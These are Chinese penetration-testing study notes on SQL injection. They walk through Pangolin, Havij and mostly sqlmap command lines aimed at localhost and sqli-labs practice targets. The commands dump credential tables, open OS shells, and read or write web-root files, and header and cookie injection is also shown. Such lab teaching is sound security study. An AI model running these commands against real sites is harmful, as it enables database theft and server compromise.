# 渗透测试基础07

# SQL注入原理攻击方法（常见搭建环境、安全工具的使用—pangolin穿山甲、havij萝卜头、sqlmap（Windows版+kali版）的注入使用）



## 安全工具的使用：

windows+iis（网站服务器）+asp/aspx(asp.net)+access/mssql【企业内部使用概率大】【打下来是普通用户权限】

windows+apache+php+mysql= wamp（一般使用软件进行集成化搭建)【老版本PHPadmin有漏洞】【打下来是普通用户权限】

linux+apache/nginx+php+mysql = lamp/lnmp（有可能使用宝塔或者其他面板搭建）【使用较多】【打下来是网站管理的权限】

linux+tomcat+java(jsp)+oracle/mysql 【打下来是root权限】

linux+nginx+python(django/flask)+mysql【新】



## pangolin（穿山甲）

穿山甲作为老牌的SQL注入工具，在注入方面支持多种提交方式，是在手动发现注入点之后，一款比较好用的注入工具。

1. 打开界面，复制URL，选择类型——如integer数字类型注入（对id注入），选择数据库类型DB——MySQL，选择提交方式——POST（登录框）、GET（URL），然后点击开始start按键。

2. ![image-20211201210605649](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20211201210605649.png)

3. ![image-20211201210643443](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20211201210643443.png)

4. 获取数据库内容

   ![image-20211201210728395](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20211201210728395.png)

   ![image-20211201210750359](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20211201210750359.png)

5. 读取与写入文件

   ![image-20210918133638522](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20210918133638522.pngg)

6. 扫描系统信息

   ![image-20210918133715191](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20210918133715191.png)

7. 探测后台

   ![image-20210918133813640](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20210918133813640.png)



## havij(萝卜头)

使用前双击注册，然后再使用

![image-20220109205119770](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109205119770.png)



## sqlmap（sql注入神器）

直接在含有sqlmap.py文件的文件夹查找栏里输入cmd打开命令行，输入sqlmap.py得到如图：

![image-20211201211354574](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20211201211354574.png)

### 基本语句：

跑一下大概的信息

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13即发现的注入点"
```

```
-u
#URL 探测这个网址和系统的最基本信息
```

```
Ctrl+C
#打断进程
```

```
#很卡的原因：每次访问都相当于第一次打开（TCP慢启动机制，如果每次发包太快会被怀疑有问题然后被拦截）
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --keep-alive
sqlmap.py -u "http://172.16.1.143:8--keep-alive

--keep-alive
#保持链接常开状态，保持会话，但有被防火墙发现和拦截的风险
```

```
中途有跳出询问的语句，可以直接回车
```

判断一下是否是数据库管理员

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --is-dba
```

（如果是数据库管理员，则可以跳过查看数据库内容——因为知道数据库名是为了看表，现在就可以直接看所有表名，不过查询内容会较多）

查看一下所有的数据库

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --dbs

--dbs
#查看一下所有的数据库
```

查看当前所用的数据库

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --current-db

--current-db
#查看当前所用的数据库
```

列出当前数据库的表名

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --tables -D xycms

-D xycms
#指定数据库名为xycms
--tables
#列出当前数据库的表名
```

查看表的列名

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --columns -T manage_user -D xycms

-T manage_user
#指定表名manage_user
--columns
#查看表的列名
```

查看字段

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --dump -C m_name,m_pwd -T  manage_user -D xycms

-C m_name,m_pwd
#指定列名m_name和m_pwd
--dump
#查看字段
```

执行系统命令

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --os-shell

--os-shell
#执行系统命令——自己探测其根目录地址，写入一个php文件，然后让php文件帮我们执行某些命令——可能失败
```

执行sql语句

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --sql-shell

--sql-shell
#执行sql语句
```

读取文件

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --file-read="C:\phpStudy\WWW\index.php"

--file-read="C:\phpStudy\WWW\index.php"
#读取文件
```

写入文件

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --file-write="C:\1.php" --file-dest="C:\phpStudy\WWW\xxx.php"

--file-write="C:\1.php" --file-dest="C:\phpStudy\WWW\xxx.php"
#写入文件
```



### kali版本sqlmap的标准用法：

```
sqlmap -u [目标url] --dbs
#获取目标网站的库名
#发现security库

sqlmap -u [目标url] -D security --tables
#获取库里的表
#发现users表的列

sqlmap -u [目标url] -D security -T users --columns
#发现id username password

#找到id,username,password的内容
sqlmap -u [目标url] -D security -T users -C username,password --dump
```



**完整版命令**：

```css
sqlmap -u [目标url] --dbs --batch --threads 10 --technique U
#使用sqlmap的10线程，batch忽略错误，使用union select注入目标网站
```





**无法发现报错位，但是数据库出错会爆出来**

### 报错注入：

(error based)

```
sqlmap -u [目标url] --current-db --batch --threads 10 --technique E
# 使用报错注入
```





**无法发现报错位，数据库被破坏也无法爆出来，但是界面上只会出现有和没有东西两种情况**

### 布尔型注入：

(booled based)

```
sqlmap -u [目标url] --current-db --batch --threads 10 --technique B
```





**无法发现报错位，数据库被破坏也无法爆出来，界面也没有出现或者消失东西的现象**

### 布尔型时间盲注：

(time based)

```
sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3
```



### post方面注入：

```
$uname = $_POST['uname'];
$passwd = $_POST['password'];
```

```
查：
select username,password from users where username='$uname' and password='$passwd' limit 0,1
```

```
sqlmap:
sqlmap -u http://sqlilabs.njhack.xyz/Less-11/ --data "uname=admin*&passwd=admin&submit=Submit" --current-db --batch --threads 10 --technique E

--data 后面跟的是post的数据【用purbsuite抓包得到】
*号标哪，就是让sqlmap打哪
```





**有的网站可能会搜集用户的浏览器信息：**

### 请求头注入：

```
ip地址，user-agent（浏览器信息）,referer（来路）,cookie

sqlmap -u http://sqlilabs.njhack.xyz/Less-18/ --user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*" --level 4 --dbs --threads 10 --batch --technique E

# 在使用请求头注入的时候，--level必须大于3

# *号标哪，就是让sqlmap打哪


sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie="uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690" --level 4 --dbs --threads 10 --batch --technique E

# cookie=？【用purbsuite抓包得到】
# *号标哪，就是让sqlmap打哪
```





